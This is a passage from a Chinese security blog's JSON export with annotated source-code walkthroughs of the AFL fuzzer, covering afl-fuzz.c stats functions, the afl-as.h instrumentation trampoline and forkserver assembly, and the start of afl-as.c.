getpid()，获取当前pid \"cycles_done : %llu\\n\" // queue_cycle ? (queue_cycle - 1) : 0，表示queue队列被完全变异一次的次数 \"execs_done : %llu\\n\" // total_execs，target的总的执行次数，每次run_target的时候会增加1 \"execs_per_sec : %0.02f\\n\"// eps，每秒执行的次数 \"paths_total : %u\\n\" // queued_paths，每次add_to_queue的时候会增加1，代表queue里的样例总数 \"paths_favored : %u\\n\" // queued_favored，\"有利\"的路径总数，在cull_queue中计算出来 \"paths_found : %u\\n\" // queued_discovered，在每次common_fuzz_stuff去执行一次fuzz时，发现新的interesting case的时候会增加1，代表在fuzz运行期间发现的新queue entry \"paths_imported : %u\\n\" // queued_imported，master-slave模式下，如果sync过来的case是interesting的，就增加1 \"max_depth : %u\\n\" // max_depth，最大路径深度 \"cur_path : %u\\n\" // current_entry，current_entry一般情况下代表的是正在执行的queue entry的整数ID，queue首节点的ID是0，必须符合find_start_position() \"pending_favs : %u\\n\" // pending_favored，等待fuzz的favored paths数 \"pending_total : %u\\n\" // pending_not_fuzzed，在queue中等待fuzz的case数 \"variable_paths : %u\\n\" // queued_variable，导致可变路径的case数 \"stability : %0.02f%%\\n\" \"bitmap_cvg : %0.02f%%\\n\" \"unique_crashes : %llu\\n\" // 在save_if_interesting时，如果fault是FAULT_CRASH，则unique_crashes计数器加1 \"unique_hangs : %llu\\n\" // 在save_if_interesting时，如果fault是FAULT_TMOUT，且exec_tmout小于hang_tmout，就以hang_tmout为超时时间再执行一次，如果还超时，就让unique_hangs计数器加一 \"last_path : %llu\\n\" // last_path_time / 1000，当add_to_queue将一个新case加入queue时，就设置一次last_path_time为当前时间 \"last_crash : %llu\\n\" // last_crash_time / 1000，在unique_crashes加一的时候，last_crash更新为当前时间 \"last_hang : %llu\\n\" // last_hang_time / 1000，在unique_hangs加一的时候，last_hang更新为当前时间 \"execs_since_crash : %llu\\n\" // total_execs - last_crash_execs，表示在上一次crash之后总计执行了多少次 \"exec_timeout : %u\\n\" // exec_tmout，配置好的超时时间，必须符合find_timeout() \"afl_banner : %s\\n\" \"afl_version : \" VERSION \"\\n\" \"target_mode : %s%s%s%s%s%s%s\\n\" // fuzz时采用的所有执行模式 \"command_line : %s\\n\" // 原始参数，在save_cmdline中保存 \"slowest_exec_ms : %llu\\n\", // 单个用例最慢执行时间，在run_target中设置 start_time / 1000, get_cur_time() / 1000, getpid(), queue_cycle ? (queue_cycle - 1) : 0, total_execs, eps, queued_paths, queued_favored, queued_discovered, queued_imported, max_depth, current_entry, pending_favored, pending_not_fuzzed, queued_variable, stability, bitmap_cvg, unique_crashes, unique_hangs, last_path_time / 1000, last_crash_time / 1000, last_hang_time / 1000, total_execs - last_crash_execs, exec_tmout, use_banner, qemu_mode ? \"qemu \" : \"\", dumb_mode ? \" dumb \" : \"\", no_forkserver ? \"no_forksrv \" : \"\", crash_mode ? \"crash \" : \"\", persistent_mode ? \"persistent \" : \"\", deferred_mode ? \"deferred \" : \"\", (qemu_mode || dumb_mode || no_forkserver || crash_mode || persistent_mode || deferred_mode) ? \"\" : \"default\", orig_cmdline, slowest_exec_ms); /* ignore errors */ /* 统计子进程的资源用量。在调用getrusage之前需要保证杀死fork server进程，并调用了waitpid */ if (getrusage(RUSAGE_CHILDREN, &usage)) { WARNF(\"getrusage failed\"); } else if (usage.ru_maxrss == 0) { fprintf(f, \"peak_rss_mb : not available while afl is running\\n\"); } else {#ifdef __APPLE__ fprintf(f, \"peak_rss_mb : %zu\\n\", usage.ru_maxrss >> 20);#else fprintf(f, \"peak_rss_mb : %zu\\n\", usage.ru_maxrss >> 10);#endif /* ^__APPLE__ */ } fclose(f);} save_autoc1234567891011121314151617181920212223242526272829/* 保存自动生成的extras(token) */static void save_auto(void) { u32 i; /* 如果auto_changed为0，就直接return；否则，就将其置0 */ if (!auto_changed) return; auto_changed = 0; /* 1.拼接路径out_dir/queue/.state/auto_extras/auto_i，并赋值给fn 2.创建路径fn指定的文件 3.将a_extras写入创建的文件中 */ for (i = 0; i < MIN(USE_AUTO_EXTRAS, a_extras_cnt); i++) { u8* fn = alloc_printf(\"%s/queue/.state/auto_extras/auto_%06u\", out_dir, i); s32 fd; fd = open(fn, O_WRONLY | O_CREAT | O_TRUNC, 0600); if (fd < 0) PFATAL(\"Unable to create '%s'\", fn); ck_write(fd, a_extras[i].data, a_extras[i].len, fn); close(fd); ck_free(fn); }} 完结撒花 (๑•̀ㅂ•́)و✧ 参考资料 skr：sakuraのAFL源码全注释 hollk：AFL源码分析之afl-fuzz.c详细注释 ScUpax0s：AFL源码阅读笔记之gcc与fuzz部分 Seebug：AFL 二三事——源码分析 AFL：afl-fuzz.c HICOOKIE：AFL-Learning AFL内部实现细节小记 博客园：Linux进程间通信（一）：信号signal()、sigaction() 博客园：Linux进程间通信（六）：共享内存 shmget()、shmat()、shmdt()、shmctl 知乎：Linux 的进程间通信-管道 博客园：进程间通信管道进阶篇-linux下dup/dup2函数的用法 AFL源码分析03：afl-as.h CSDN：setsid的作用 博客园：Linux–setsid()与进程组、会话、守护进程 博客园：C语言中volatile关键字与汇编 CSDN：linux系统编程之信号（八）：三种时间结构及定时器setitimer()详解 博客园：WIFEXITED WEXITSTATUS WIFSIGNALED CSDN：经典算法系列之(一) - BitMap [数据的压缩存储]","categories":[],"tags":[{"name":"二进制安全","slug":"二进制安全","permalink":"http://cata1oc.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"},{"name":"Fuzzing","slug":"Fuzzing","permalink":"http://cata1oc.github.io/tags/Fuzzing/"}]},{"title":"AFL源码分析03：afl-as.h","slug":"AFL源码分析03","date":"2022-01-07T06:43:25.000Z","updated":"2022-05-17T15:55:37.225Z","comments":true,"path":"2022/01/07/AFL源码分析03/","link":"","permalink":"http://cata1oc.github.io/2022/01/07/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%9003/","excerpt":"","text":"前言本篇是（普通）插桩的最后一部分，主要是分析afl-as.h中关于桩代码的实现过程，文中涉及到大量汇编，需要一定的汇编语言基础才能看懂。此外，由于本人不喜AT&T格式的汇编，因此在分析时，选择用gdb查看经过afl-gcc编译后的程序，并以Intel汇编格式的桩代码进行分析。 前置知识系统调用/库函数本篇的内容以汇编为主，同时也用到了一些系统调用或者库函数调用，这里对它们做简要介绍，完整的内容信息可以通过man 2 ***(系统调用)或man 3 ***(库函数)进行查看： c12345678910111213141516171819202122232425262728293031/* 作用：将一个字符串转换为整数(这是一个库函数，其余均为系统调用) 返回值：返回转换后的值*/int atoi(const char *nptr);/* 作用：启动对shmid标记的共享内存的访问，并把共享内存连接到当前进程的地址空间 返回值：执行成功时返回一个指向共享内存第一个字节的指针；如果失败，返回-1 */void *shmat(int shmid, const void *shmaddr, int shmflg);/* 作用：从缓冲区buf中，读取couunt指定长度的字节，并将其写入到文件描述符fd所指定的文件中 返回值：如果执行成功，返回指定字节的数量；如果失败，则返回-1 */ssize_t write(int fd, const void *buf, size_t count);/* 作用：从文件描述符fd指定的文件中，读取指定大小字节count，到buf指定的缓冲区中 返回值：若读取成功，则返回读取字节数；如果失败，就返回-1 */ssize_t read(int fd, void *buf, size_t count);/* 作用：通过复制调用它的进程来创建一个新进程 返回值：如果是父进程，则返回值为子进程的PID；如果是子进程，则返回0 */pid_t fork(void);/* 作用：等待改变状态的进程(通常用于等待子进程结束) 返回值：如果执行成功，返回发生状态改变的子进程的PId */pid_t waitpid(pid_t pid, int *wstatus, int options);/* 作用：终止调用它的进程 返回值：该函数不返回 */void _exit(int status);/* 作用：关闭一个文件描述符，该文件描述符将不再指向任何文件 返回值：如果成功返回0；如果失败返回-1 */int close(int fd); afl-as.h源码分析关键变量Code1234567891011(gdb) x/20sw 0x40180x4018 : U\"\"0x401c : U\"\"0x4020 : U\"\"0x4024 : U\"\"0x4028 : U\"\"0x402c : U\"\"0x4030 : U\"\"0x4034 : U\"\"0x4038 : U\"\"0x403c :U\"\" __afl_area_ptr：用于存储共享内存地址 __afl_prev_loc：上一个插桩的位置，由R(MAP_SIZE)生成的一个随机数 __afl_fork_pid：存储fork出来的子进程的pid __afl_temp：临时缓冲区 __afl_setup_failure：标志位，若该值不为0，则退出程序 __afl_global_area_ptr：用于存储共享内存地址（全局变量） trampolinetrampoline的含义是“蹦床”，在插桩时，这就是需要被插入的桩代码，不过它本身并没有实现什么功能，主要作用是调用__afl_maybe_log函数，所以在这里可以把它理解为跳板，类似构造ROP链时用到的gadget。在afl-as.h文件中共定义了两种形式的trampoline，用于适配64/32位的运行环境，总体相差不大，这里我们介绍64位的trampoline_fmt_64： c12345678910111213141516171819static const u8* trampoline_fmt_64 = \"\\n\" \"/* --- AFL TRAMPOLINE (64-BIT) --- */\\n\" \"\\n\" \".align 4\\n\" \"\\n\" \"leaq -(128+24)(%%rsp), %%rsp\\n\" \"movq %%rdx, 0(%%rsp)\\n\" \"movq %%rcx, 8(%%rsp)\\n\" \"movq %%rax, 16(%%rsp)\\n\" \"movq $0x%08x, %%rcx\\n\" \"call __afl_maybe_log\\n\" \"movq 16(%%rsp), %%rax\\n\" \"movq 8(%%rsp), %%rcx\\n\" \"movq 0(%%rsp), %%rdx\\n\" \"leaq (128+24)(%%rsp), %%rsp\\n\" \"\\n\" \"/* --- END --- */\\n\" \"\\n\"; 以上是afl-as.h文件中，以AT&T格式存在的源码；我们可以用gdb打开经过afl-gcc编译后的文件，执行如下指令，就可以看到Intel格式的汇编了，这里在主函数开头，刚好有一段trampoline，我们可以据此分析： Code1234567891011121314(gdb) set disassembly-flavor intel (gdb) disassemble mainDump of assembler code for function main: 0x0000000000001220 : lea rsp,[rsp-0x98] 0x0000000000001228 : mov QWORD PTR [rsp],rdx 0x000000000000122c : mov QWORD PTR [rsp+0x8],rcx 0x0000000000001231 : mov QWORD PTR [rsp+0x10],rax 0x0000000000001236 : mov rcx,0x89ef 0x000000000000123d : call 0x15b8 0x0000000000001242 : mov rax,QWORD PTR [rsp+0x10] 0x0000000000001247 : mov rcx,QWORD PTR [rsp+0x8] 0x000000000000124c : mov rdx,QWORD PTR [rsp] 0x0000000000001250 : lea rsp,[rsp+0x98] 0x0000000000001258 : endbr64 由于这部分汇编很简单，就不在代码中注释了，首尾是保存和恢复现场的操作。核心就只有两条指令： mov rcx, 0x89ef：这里的 0x89af 实际上是一个随机数，用于定位执行到的代码块。参考上一篇add_instrumentation函数中的插桩语句 c123456#define MAP_SIZE_POW2 16 --> config.h#define MAP_SIZE (1 < MAP_SIZE_POW2) --> config.h types.h/* 这里的R(MAP_SIZE)，就是本例中的0x89ef(范围0~MAP_SIZE) */fprintf(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32, R(MAP_SIZE)); call 0x15b8 ：调用__afl_maybe_log函数 __afl_maybe_log该函数处理流程大致如下（图片来自初号机ScUpax0s） Code12345678(gdb) disassemble __afl_maybe_log Dump of assembler code for function __afl_maybe_log: 0x00000000000015b8 : lahf 0x00000000000015b9 : seto al 0x00000000000015bc : mov rdx,QWORD PTR [rip+0x2a55] # 0x4018 0x00000000000015c3 : test rdx,rdx 0x00000000000015c6 : je 0x15e8 End of assembler dump. lahf：将EFLAGS的低八位送入AH，即将标志寄存器EFLAGS中的SF、ZF、AF、PF、CF五个标志位分别传送到累加器AH的对应位。完整的EFLAGS可以参考这里（注意：x64与x86Eflags寄存器的低32位相同，高32位保留，因此这里可直接拿来用） seto：溢出位置位 判断 __afl_area_ptr 是否为NULL： 如果为NULL，则跳转到__afl_setup函数对__afl_area_ptr进行初始化； 如果不为NULL，继续执行 __afl_setupCode1234567891011(gdb) disassemble __afl_setupDump of assembler code for function __afl_setup: 0x00000000000015e8 : cmp BYTE PTR [rip+0x2a41],0x0 # 0x4030 0x00000000000015ef : jne 0x15e0 0x00000000000015f1 : lea rdx,[rip+0x2a40] # 0x4038 0x00000000000015f8 : mov rdx,QWORD PTR [rdx] 0x00000000000015fb : test rdx,rdx 0x00000000000015fe : je 0x1609 0x0000000000001600 : mov QWORD PTR [rip+0x2a11],rdx # 0x4018 0x0000000000001607 : jmp 0x15c8 End of assembler dump. 判断__afl_setup_failure的值是否为0： 如果为0，继续执行 如果不为0，则跳转到__afl_return返回 检查__afl_global_area_ptr文件指针是否为NULL： 如果为NULL，则跳转到__afl_setup_first进一步初始化 如果不为NULL，就将_afl_global_area_ptr的值赋给 afl_area_ptr，然后跳转到`afl_store` __afl_setup_firstCode12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849(gdb) disassemble __afl_setup_first Dump of assembler code for function __afl_setup_first: 0x0000000000001609 : lea rsp,[rsp-0x160] 0x0000000000001611 : mov QWORD PTR [rsp],rax 0x0000000000001615 : mov QWORD PTR [rsp+0x8],rcx 0x000000000000161a : mov QWORD PTR [rsp+0x10],rdi 0x000000000000161f : mov QWORD PTR [rsp+0x20],rsi 0x0000000000001624 : mov QWORD PTR [rsp+0x28],r8 0x0000000000001629 : mov QWORD PTR [rsp+0x30],r9 0x000000000000162e : mov QWORD PTR [rsp+0x38],r10 0x0000000000001633 : mov QWORD PTR [rsp+0x40],r11 0x0000000000001638 : movq QWORD PTR [rsp+0x60],xmm0 0x000000000000163e : movq QWORD PTR [rsp+0x70],xmm1 0x0000000000001644 : movq QWORD PTR [rsp+0x80],xmm2 0x000000000000164d : movq QWORD PTR [rsp+0x90],xmm3 0x0000000000001656 : movq QWORD PTR [rsp+0xa0],xmm4 0x000000000000165f : movq QWORD PTR [rsp+0xb0],xmm5 0x0000000000001668 : movq QWORD PTR [rsp+0xc0],xmm6 0x0000000000001671 : movq QWORD PTR [rsp+0xd0],xmm7 0x000000000000167a : movq QWORD PTR [rsp+0xe0],xmm8 0x0000000000001684 : movq QWORD PTR [rsp+0xf0],xmm9 0x000000000000168e : movq QWORD PTR [rsp+0x100],xmm10 0x0000000000001698 : movq QWORD PTR [rsp+0x110],xmm11 0x00000000000016a2 : movq QWORD PTR [rsp+0x120],xmm12 0x00000000000016ac : movq QWORD PTR [rsp+0x130],xmm13 0x00000000000016b6 : movq QWORD PTR [rsp+0x140],xmm14 0x00000000000016c0 : movq QWORD PTR [rsp+0x150],xmm15 0x00000000000016ca : push r12 0x00000000000016cc : mov r12,rsp 0x00000000000016cf : sub rsp,0x10 0x00000000000016d3 : and rsp,0xfffffffffffffff0 0x00000000000016d7 : lea rdi,[rip+0x2c1] # 0x199f 0x00000000000016de : call 0x1130 0x00000000000016e3 : test rax,rax 0x00000000000016e6 : je 0x18ce 0x00000000000016ec : mov rdi,rax 0x00000000000016ef : call 0x1200 0x00000000000016f4 : xor rdx,rdx 0x00000000000016f7 : xor rsi,rsi 0x00000000000016fa : mov rdi,rax 0x00000000000016fd : call 0x11f0 0x0000000000001702 : cmp rax,0xffffffffffffffff 0x0000000000001706 : je 0x18ce 0x000000000000170c : mov rdx,rax 0x000000000000170f : mov QWORD PTR [rip+0x2902],rax # 0x4018 0x0000000000001716 : lea rdx,[rip+0x291b] # 0x4038 0x000000000000171d : mov QWORD PTR [rdx],rax 0x0000000000001720 : mov rdx,raxEnd of assembler dump. 在栈中保存部分64位通用寄存器以及128位xmm寄存器组 读取环境变量_AFL_SHM_ENV的值，来获取共享内存的shm_id： 如果获取失败，就跳转到__afl_setup_abort 如果获取成功： 先调用atoi转换一下获取shm_id的值 再调用shmat启用对共享内存的访问，并把共享内存连接到当前进程的地址空间。这里如果启用失败的话，也会跳转到__afl_setup_abort 最后，将shmat返回的共享内存地址保存在变量 afl_area_ptr 和 afl_global_area_ptr 中 后面，将开始运行__afl_forkserver __afl_forkserverCode1234567891011(gdb) disassemble __afl_forkserver Dump of assembler code for function __afl_forkserver: 0x0000000000001723 : push rdx 0x0000000000001724 : push rdx 0x0000000000001725 : mov rdx,0x4 # length 0x000000000000172c : lea rsi,[rip+0x28f9] # 0x402c 0x0000000000001733 : mov rdi,0xc7 # file desc 0x000000000000173a : call 0x1170 0x000000000000173f : cmp rax,0x4 0x0000000000001743 : jne 0x17e1 End of assembler dump. 通过代码中的注释，我们可以理解这部分汇编的含义就是，将缓冲区__afl_temp中的4个字节，写入到0xc7号描述符所指定的文件中。由于这是在gdb中显示的，所以我们看到的是已经编译后的汇编，这里的0xc7，在实际源码中表现为 FORKSRV_FD+1（198+1 -> 0xc7），它代表着一个状态管道。 因此，这里真正的含义是，向状态管道中写入__afl_temp中的4个字节，告诉afl-fuzz（后面会分析到），forkserver已经成功启动，等待下一步指示。 __afl_fork_wait_loopCode1234567891011121314151617181920212223242526272829(gdb) disassemble __afl_fork_wait_loop Dump of assembler code for function __afl_fork_wait_loop: 0x0000000000001749 : mov rdx,0x4 0x0000000000001750 : lea rsi,[rip+0x28d5] # 0x402c 0x0000000000001757 : mov rdi,0xc6 0x000000000000175e : call 0x11b0 0x0000000000001763 : cmp rax,0x4 0x0000000000001767 : jne 0x18c6 0x000000000000176d : call 0x1210 0x0000000000001772 : cmp rax,0x0 0x0000000000001776 : jl 0x18c6 0x000000000000177c : je 0x17e1 0x000000000000177e : mov DWORD PTR [rip+0x28a4],eax # 0x4028 0x0000000000001784 : mov rdx,0x4 0x000000000000178b : lea rsi,[rip+0x2896] # 0x4028 0x0000000000001792 : mov rdi,0xc7 0x0000000000001799 : call 0x1170 0x000000000000179e : mov rdx,0x0 0x00000000000017a5 : lea rsi,[rip+0x2880] # 0x402c 0x00000000000017ac : mov rdi,QWORD PTR [rip+0x2875] # 0x4028 0x00000000000017b3 : call 0x11e0 0x00000000000017b8 : cmp rax,0x0 0x00000000000017bc : jle 0x18c6 0x00000000000017c2 : mov rdx,0x4 0x00000000000017c9 : lea rsi,[rip+0x285c] # 0x402c 0x00000000000017d0 : mov rdi,0xc7 0x00000000000017d7 : call 0x1170 0x00000000000017dc : jmp 0x1749 End of assembler dump. 等待fuzzer通过控制管道（文件描述符为0xc6，即源码中FORKSRV_FD的值）发送来的命令，并读取4个字节到__afl_temp中 –> read(0xc6, __afl_temp, 0x4); 如果读取失败，则跳转到__afl_die 如果读取成功，说明afl-fuzz命令新建进程执行一次测试，则调用fork创建一个子进程： 如果返回值小于0，说明创建失败，跳转到__afl_die 如果返回值等于0，说明位于子进程，跳转到__afl_fork_resume中执行 如果返回值大于0，说明位于父进程，父进程充当for server和afl-fuzz进行通信，并进行如下操作 将返回值，也就是子进程的pid，保存到变量__afl_fork_pid中 调用write，将子进程的pid写入到状态管道（文件描述为0xc7）告知afl-fuzz –> write(0xc7, __afl_fork_pid, 0x4) 等待子进程结束，其中afl_temp将保存执行结果的状态信息 –> `waitpid(afl_for_pid, &__afl_temp, 0x0)` 如果返回值为0，就跳转到__afl_die 调用write，将__afl_temp中的值写入状态管道告知afl-fuzz –> write(0xc7, __afl_temp, 0x4) 跳转回__afl_fork_wait_loop的开头，开始执行下一轮，继续不断从控制管道读取命令 __afl_fork_resumeCode12345678910111213141516171819202122232425262728293031323334353637(gdb) disassemble __afl_fork_resume Dump of assembler code for function __afl_fork_resume: 0x00000000000017e1 : mov rdi,0xc6 0x00000000000017e8 : call 0x11a0 0x00000000000017ed : mov rdi,0xc7 0x00000000000017f4 : call 0x11a0 0x00000000000017f9 : pop rdx 0x00000000000017fa : pop rdx 0x00000000000017fb : mov rsp,r12 0x00000000000017fe : pop r12 0x0000000000001800 : mov rax,QWORD PTR [rsp] 0x0000000000001804 : mov rcx,QWORD PTR [rsp+0x8] 0x0000000000001809 : mov rdi,QWORD PTR [rsp+0x10] 0x000000000000180e : mov rsi,QWORD PTR [rsp+0x20] 0x0000000000001813 : mov r8,QWORD PTR [rsp+0x28] 0x0000000000001818 : mov r9,QWORD PTR [rsp+0x30] 0x000000000000181d : mov r10,QWORD PTR [rsp+0x38] 0x0000000000001822 : mov r11,QWORD PTR [rsp+0x40] 0x0000000000001827 : movq xmm0,QWORD PTR [rsp+0x60] 0x000000000000182d : movq xmm1,QWORD PTR [rsp+0x70] 0x0000000000001833 : movq xmm2,QWORD PTR [rsp+0x80] 0x000000000000183c : movq xmm3,QWORD PTR [rsp+0x90] 0x0000000000001845 : movq xmm4,QWORD PTR [rsp+0xa0] 0x000000000000184e : movq xmm5,QWORD PTR [rsp+0xb0] 0x0000000000001857 : movq xmm6,QWORD PTR [rsp+0xc0] 0x0000000000001860 : movq xmm7,QWORD PTR [rsp+0xd0] 0x0000000000001869 : movq xmm8,QWORD PTR [rsp+0xe0] 0x0000000000001873 : movq xmm9,QWORD PTR [rsp+0xf0] 0x000000000000187d : movq xmm10,QWORD PTR [rsp+0x100] 0x0000000000001887 : movq xmm11,QWORD PTR [rsp+0x110] 0x0000000000001891 : movq xmm12,QWORD PTR [rsp+0x120] 0x000000000000189b : movq xmm13,QWORD PTR [rsp+0x130] 0x00000000000018a5 : movq xmm14,QWORD PTR [rsp+0x140] 0x00000000000018af : movq xmm15,QWORD PTR [rsp+0x150] 0x00000000000018b9 : lea rsp,[rsp+0x160] 0x00000000000018c1 : jmp 0x15c8 End of assembler dump. 调用close关闭子进程中的文件描述符（状态管道和控制管道） 恢复子进程的寄存器状态 跳转到__afl_store开始执行 __afl_storeCode1234567(gdb) disassemble __afl_store Dump of assembler code for function __afl_store: 0x00000000000015c8 : xor rcx,QWORD PTR [rip+0x2a51] # 0x4020 0x00000000000015cf : xor QWORD PTR [rip+0x2a4a],rcx # 0x4020 0x00000000000015d6 : shr QWORD PTR [rip+0x2a43],1 # 0x4020 0x00000000000015dd : inc BYTE PTR [rdx+rcx*1]End of assembler dump. 计算并存储代码命中位置，__afl_prev_loc为前一次跳转位置，rcx为当前跳转位置，rdx为共享内存的地址 令__afl_prev_loc获取到rcx的值，即当前跳转位置，然后右移一位 在共享内存中，在新的存储路径的位置（将__afl_prev_loc与rcx异或后的结果作为下标）自增1 这部分直接通过汇编来解释，不是很好理解，拖进IDA，查看伪代码 先来看几个关键的变量，首先是a4，这里__afl_maybe_log虽然有4个参数，原因是IDA识别的问题，IDA误将保存现场的操作当成了参数传递。因此在整个执行流程中，这里的a1，a2，a3都没有用到，真正的参数只有这里的a4。回顾前文trampoline中的汇编指令，可以得知，这里的a4，就是那通过 R(MAP_SIZE) 生成的一个随机数，这个随机数的作用就是定位当前插桩的位置。另一个关键变量v6，这个通过对前面__afl_setup和__afl_setup_first的分析，可以得出，这个v6就是共享内存的地址。根据这些信息，我们对这部分伪代码做个优化（这里摘取了sakura与hicookie的分析）： c1234567891011121314151617181920212223/* AFL是根据二元tuple(跳转的源位置，目标位置)来记录分支信息，从而获取目标程序的执行流程和代码覆盖情况1. 为了简化连接复杂对象的过程和保存xor输出平均分布，当前位置是随机产生的。用sakura的话来说，AFL为每个代码块生成一个 随机数，作为该代码块“位置”的记录。2. share_mem[]数组是一个调用者传给被插桩程序的64KB大小的共享内存区域，数组的元素是Byte。数组中的每个元 素都会被编码， 在这里就是将“源位置”和“目标位置”的两个随机数进行异或运算，生成一个key，保存每个分支的执行次数，实际上是一个哈希表。 这个数组的大小要应该能存2K~10K个分支节点，这样既可以减少冲突(当然还是会存在碰撞的问题，但对于不是很复杂的目标，碰 撞概率还是可以接受的)，也可以实现毫秒级别的分析。这种形式的覆盖率，相对于简单的基本块覆盖率来说，对程序运行路径提供 了一个更好的描述。以下面两个路径产生的tulpes为例： A -> B -> C -> D -> E (tuples: AB, BC, CD, DE) A -> B -> D -> C -> E (tuples: AB, BD, DC, CE) 这更有助于发现代码的漏洞，因为大多数安全漏洞经常是一些没有预料到的状态转移，而不是因为没有覆盖那一块代码3. 最后一行右移操作是用来保持tuples的定向性，会将cur_location右移1位后，再保存到prev_location中。如果没有右移操作， 假设target中存在A->A和B->B这样两个跳转，那么这两个分支对应的异或后的key都是0，从而无法区分。对于B->A和A->B的情况 也是一样 */cur_location = a4;shared_mem = v6;v7 = cur_location ^ prev_location;shared_mem[v7]++;prev_location = (prev_location ^ v7) >> 1 = cur_location >> 1 __afl_dieCode12345(gdb) disassemble __afl_die Dump of assembler code for function __afl_die: 0x00000000000018c6 : xor rax,rax 0x00000000000018c9 : call 0x1150 End of assembler dump. 设置参数status的值为0 调用_exit终止程序 __afl_setup_abortCode1234567891011121314151617181920212223242526272829303132(gdb) disassemble __afl_setup_abort Dump of assembler code for function __afl_setup_abort: 0x00000000000018ce : inc BYTE PTR [rip+0x275c] # 0x4030 0x00000000000018d4 : mov rsp,r12 0x00000000000018d7 : pop r12 0x00000000000018d9 : mov rax,QWORD PTR [rsp] 0x00000000000018dd : mov rcx,QWORD PTR [rsp+0x8] 0x00000000000018e2 : mov rdi,QWORD PTR [rsp+0x10] 0x00000000000018e7 : mov rsi,QWORD PTR [rsp+0x20] 0x00000000000018ec : mov r8,QWORD PTR [rsp+0x28] 0x00000000000018f1 : mov r9,QWORD PTR [rsp+0x30] 0x00000000000018f6 : mov r10,QWORD PTR [rsp+0x38] 0x00000000000018fb : mov r11,QWORD PTR [rsp+0x40] 0x0000000000001900 : movq xmm0,QWORD PTR [rsp+0x60] 0x0000000000001906 : movq xmm1,QWORD PTR [rsp+0x70] 0x000000000000190c : movq xmm2,QWORD PTR [rsp+0x80] 0x0000000000001915 : movq xmm3,QWORD PTR [rsp+0x90] 0x000000000000191e : movq xmm4,QWORD PTR [rsp+0xa0] 0x0000000000001927 : movq xmm5,QWORD PTR [rsp+0xb0] 0x0000000000001930 : movq xmm6,QWORD PTR [rsp+0xc0] 0x0000000000001939 : movq xmm7,QWORD PTR [rsp+0xd0] 0x0000000000001942 : movq xmm8,QWORD PTR [rsp+0xe0] 0x000000000000194c : movq xmm9,QWORD PTR [rsp+0xf0] 0x0000000000001956 : movq xmm10,QWORD PTR [rsp+0x100] 0x0000000000001960 : movq xmm11,QWORD PTR [rsp+0x110] 0x000000000000196a : movq xmm12,QWORD PTR [rsp+0x120] 0x0000000000001974 : movq xmm13,QWORD PTR [rsp+0x130] 0x000000000000197e : movq xmm14,QWORD PTR [rsp+0x140] 0x0000000000001988 : movq xmm15,QWORD PTR [rsp+0x150] 0x0000000000001992 : lea rsp,[rsp+0x160] 0x000000000000199a : jmp 0x15e0 End of assembler dump. 将变量__afl_setup_failure的值置1 恢复寄存器的状态 调用__afl_return __afl_returnCode1234567(gdb) disassemble __afl_return Dump of assembler code for function __afl_return: 0x00000000000015e0 : add al,0x7f 0x00000000000015e2 : sahf 0x00000000000015e3 : ret 0x00000000000015e4 : nop DWORD PTR [rax+0x0]End of assembler dump. 调整一下寄存器AL的值，此操作不影响AH的值 将AH的内容送给标志寄存器的低8位，也就是恢复EFLAGS低8位的值 执行ret指令返回 伪代码将经过插桩编译后的程序，扔进IDA，找到函数__afl_maybe_log并查看伪代码，便可以更加清晰的理解整个桩代码的执行流程： 参考资料 skr：sakuraのAFL源码全注释 Seebug：AFL 二三事——源码分析 AFL内部实现细节小记 AFL：afl-as.h HICOOKIE：AFL-Learning 简书：AFL源码分析 EFLAGS寄存器图解 初号机/ScUpax0s：AFL源码阅读笔记之gcc与fuzz部分 CSDN：x86汇编基础 Jussi Judin：afl-fuzz on different file systems","categories":[],"tags":[{"name":"二进制安全","slug":"二进制安全","permalink":"http://cata1oc.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"},{"name":"Fuzzing","slug":"Fuzzing","permalink":"http://cata1oc.github.io/tags/Fuzzing/"}]},{"title":"AFL源码分析02：afl-as.c","slug":"AFL源码分析02","date":"2022-01-05T06:43:25.000Z","updated":"2022-05-17T15:55:11.836Z","comments":true,"path":"2022/01/05/AFL源码分析02/","link":"","permalink":"http://cata1oc.github.io/2022/01/05/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%9002/","excerpt":"","text":"前言前一篇分析了afl-gcc，它相当于gcc的一个wrapper，最后会调用实际的gcc，并编辑参数指定汇编器afl-as；本篇则分析（普通）插桩过程中的另一个wrapper：afl-as，他是对GNU as的一个wrapper，会编辑好参数并插桩后，调用实际的as进行汇编操作。 afl-as.c源码分析关键(全局)变量c12345678910static u8** as_params; /* Parameters passed to the real 'as'， 传递给as的参数数组 */static u8* input_file; /* Originally specified input file 指定的输入文件 */static u8* modified_file; /* Instrumented file for the real 'as' 经过afl-as进行插桩处理后的文件 */static u8 be_quiet, /* Quiet mode (no stderr output) */ clang_mode, /* Running in clang mode? */ pass_thru, /* Just pass data through? */ just_version, /* Just show version? */ sanitizer; /* Using ASAN/MSAN? */static u32 inst_ratio = 100, /* Instrumentation probability (%) 插桩覆盖率 */ as_par_cnt = 1; /* Number of params to 'as' 用于计算传给as_params数组的参数个数 */ mainc12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788/* 主函数入口点 */int main(int argc, char** argv) { s32 pid; u32 rand_seed; int status; /* 获取环境变量AFL_LAST_RATIO，该环境变量主要控制检测每个分支的概率， 取值为0~100%，设置为0时则只检测函数入口的跳转，不检测函数分支的跳转 */ u8* inst_ratio_str = getenv(\"AFL_INST_RATIO\"); struct timeval tv; struct timezone tz; clang_mode = !!getenv(CLANG_ENV_VAR); if (isatty(2) && !getenv(\"AFL_QUIET\")) { SAYF(cCYA \"afl-as \" cBRI VERSION cRST \" by \\n\"); } else be_quiet = 1; if (argc < 2) { SAYF(\"\\n\" \"This is a helper application for afl-fuzz. It is a wrapper around GNU 'as',\\n\" \"executed by the toolchain whenever using afl-gcc or afl-clang. You probably\\n\" \"don't want to run this program directly.\\n\\n\" \"Rarely, when dealing with extremely complex projects, it may be advisable to\\n\" \"set AFL_INST_RATIO to a value less than 100 in order to reduce the odds of\\n\" \"instrumenting every discovered branch.\\n\\n\"); exit(1); } /* 通过gettimeofday获取时区和时间，然后设置srandom用的随机种子并进行初始化 */ gettimeofday(&tv, &tz); rand_seed = tv.tv_sec ^ tv.tv_usec ^ getpid(); 